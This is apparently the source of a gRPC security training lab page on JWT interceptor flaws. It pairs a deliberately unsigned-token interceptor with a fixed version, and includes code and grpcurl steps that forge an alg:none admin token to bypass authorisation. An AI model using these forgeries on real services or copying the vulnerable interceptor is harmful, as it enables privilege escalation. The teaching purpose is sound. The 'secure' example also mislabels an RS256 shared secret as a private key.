"use client";

import { useState } from "react";
import { Terminal, ShieldAlert, Cpu, KeySquare, BookOpen } from "lucide-react";
import CodeDiff from "@/components/CodeDiff";

const vulnerableCode = `// Vulnerability: Flawed Custom JWT Interceptor
function withAuthInterceptor(handler, requiredRole) {
  return function(call, callback) {
    const authHeader = call.metadata.get('authorization')[0];
    if (!authHeader) return callback({ code: 16 });

    try {
      // VULNERABLE: Base64 decoding the payload without checking the Cryptographic Signature!
      // Attackers can forge any payload they want!
      const payloadB64 = authHeader.split('.')[1];
      const payloadStr = Buffer.from(payloadB64, 'base64').toString('utf8');
      const payload = JSON.parse(payloadStr);

      if (payload.role !== requiredRole) {
         return callback({ code: 7, details: "Insufficient Role" });
      }

      return handler(call, callback);
    } catch (e) { ... }
  };
}`;

const secureCode = `// Secure: Verifying Cryptographic Signatures
const jwt = require('jsonwebtoken');

function withAuthInterceptor(handler, requiredRole) {
  return function(call, callback) {
    const authHeader = call.metadata.get('authorization')[0];
    if (!authHeader) return callback({ code: grpc.status.UNAUTHENTICATED });

    try {
      const token = authHeader.split(' ')[1];
      
      // SECURE: jwt.verify() checks the signature using the server's private key.
      // Forged tokens will throw an exception immediately.
      const payload = jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['RS256'] });

      if (payload.role !== requiredRole) {
         return callback({ code: grpc.status.PERMISSION_DENIED });
      }

      return handler(call, callback);
    } catch (e) { ... }
  };
}`;

export default function InterceptorModule() {
  const [response, setResponse] = useState<string>("Waiting for execution...");
  const [loading, setLoading] = useState(false);
  const [jwtPayload, setJwtPayload] = useState('{"role":"admin"}');

  const executeAttack = async () => {
    setLoading(true);
    setResponse("Forging JWT and injecting into Metadata...");
    
    try {
      // Create a fake JWT token: Header.Payload.Signature
      const fakeHeader = btoa('{"alg":"none","typ":"JWT"}');
      const fakePayload = btoa(jwtPayload);
      const fakeSignature = "invalid_signature";
      
      const forgedToken = `${fakeHeader}.${fakePayload}.${fakeSignature}`;

      const res = await fetch('/api/attack', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          service: 'SecureAdminService',
          method: 'triggerSystemBackup',
          payload: { target_system: "Production DB" },
          metadata: { "authorization": `Bearer ${forgedToken}` }
        })
      });

      const data = await res.json();
      setResponse(JSON.stringify(data, null, 2));
    } catch (e: any) {
      setResponse("Error executing attack: " + e.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="container mx-auto p-4 md:p-8 space-y-12 pb-24 max-w-5xl">
       <div className="space-y-4">
        <div className="flex items-center gap-3">
          <KeySquare className="text-pink-400" size={32} />
          <h1 className="text-4xl font-bold">Module 6: Interceptor Logic Flaws</h1>
        </div>
        <p className="text-xl text-muted-foreground">Forging Metadata to bypass flawed Middleware.</p>
      </div>

       <div className="glass-panel p-6 md:p-8 rounded-2xl space-y-6">
        <h2 className="text-2xl font-bold flex items-center gap-2 text-pink-400"><BookOpen size={24}/> The Protocol Deep Dive</h2>
        <div className="space-y-4 text-gray-300 leading-relaxed">
          <p>
            To avoid the issue seen in Module 4 (forgetting to authorize specific methods), secure gRPC systems use <strong>Interceptors</strong>. Interceptors act like global middleware, sitting between the network and your handlers. 
          </p>
          <p>
            However, gRPC metadata strings are highly susceptible to format manipulation. A common catastrophic flaw occurs when developers manually parse JWTs via <code>Buffer.from(b64, 'base64')</code> to extract roles, but they forget to verify the <em>Cryptographic Signature</em> using a robust library.
          </p>
          <p>
            If the interceptor just trusts the JSON string it decoded, an attacker can construct a fake <code>"alg": "none"</code> token, set their role to <code>admin</code>, and completely bypass the interceptor to compromise the <code>SecureAdminService</code>.
          </p>
        </div>
        <CodeDiff vulnerableCode={vulnerableCode} secureCode={secureCode} />

        <div className="mt-8 border-t border-white/10 pt-8">
          <h3 className="text-xl font-bold flex items-center gap-2 text-red-400 mb-4">🦇 Bug Bounty: The Black Box Approach</h3>
          <p className="text-gray-300 text-sm leading-relaxed mb-4">
            If you intercept a gRPC request in Burp Suite and notice a JWT token inside the Metadata, you can perform offline forgery. The backend code might be parsing the JWT blindly.
          </p>
          <div className="bg-black/60 p-4 rounded-lg border border-red-500/20 font-mono text-xs text-gray-300 mb-4">
            <span className="text-red-400"># 1. Take your lowly User JWT and decode it offline (e.g. using CyberChef or jwt.io)</span><br />
            Header: &#123;"alg":"RS256"&#125;<br />
            Payload: &#123;"role":"user"&#125;<br /><br />
            
            <span className="text-red-400"># 2. Forge a new token, changing the algorithm to 'none' and role to 'admin', stripping the signature.</span><br />
            Header: &#123;"alg":"none"&#125;   -&gt; Base64: eyJhbGciOiJub25lIn0=<br />
            Payload: &#123;"role":"admin"&#125; -&gt; Base64: eyJyb2xlIjoiYWRtaW4ifQ==<br />
            Signature: (Leave empty)<br /><br />

            <span className="text-red-400"># 3. Fire the forged token at the restricted endpoint via grpcurl</span><br />
            $ grpcurl -rpc-header "authorization: Bearer eyJhbGciOiJub25l... ." -plaintext target lab.SecureAdminService/TriggerSystemBackup
          </div>
          <p className="text-gray-300 text-sm">
            If the interceptor uses generic Base64 decoding (like the vulnerable code above) instead of strict cryptographic <code>jwt.verify</code>, it will approve the request!
          </p>
        </div>
      </div>

      <div className="grid md:grid-cols-2 gap-8">
        <div className="glass-panel p-6 rounded-2xl space-y-4 flex flex-col justify-between">
          <div>
            <h2 className="text-xl font-bold flex items-center gap-2 text-pink-400"><Cpu size={20}/> Attack Payload</h2>
            
            <div className="mt-4">
              <label className="text-xs text-muted-foreground mb-1 block">Forged JSON Web Token Payload:</label>
              <textarea 
                value={jwtPayload}
                onChange={(e) => setJwtPayload(e.target.value)}
                rows={3}
                className="w-full bg-black/50 border border-white/20 rounded-lg p-3 font-mono text-sm text-pink-400 focus:outline-none focus:border-pink-500 transition-colors"
                spellCheck="false"
              />
            </div>
            <p className="text-xs text-gray-400 py-2">We will automatically encode this into a JWT format and inject it into the `authorization` gRPC Metadata.</p>
          </div>
          <button 
            onClick={executeAttack}
            disabled={loading}
            className="w-full bg-pink-600 hover:bg-pink-500 text-white font-mono rounded-lg py-3 flex justify-center items-center gap-2 transition-all mt-6"
          >
            <Terminal size={18} /> Forge Token & Exploit
          </button>
        </div>

        <div className="h-[400px]">
          <div className="glass-panel p-4 rounded-2xl h-full flex flex-col font-mono text-sm">
            <pre className="flex-1 overflow-x-auto text-pink-400 whitespace-pre-wrap">
              {response}
            </pre>
          </div>
        </div>
      </div>
    </div>
  );
}
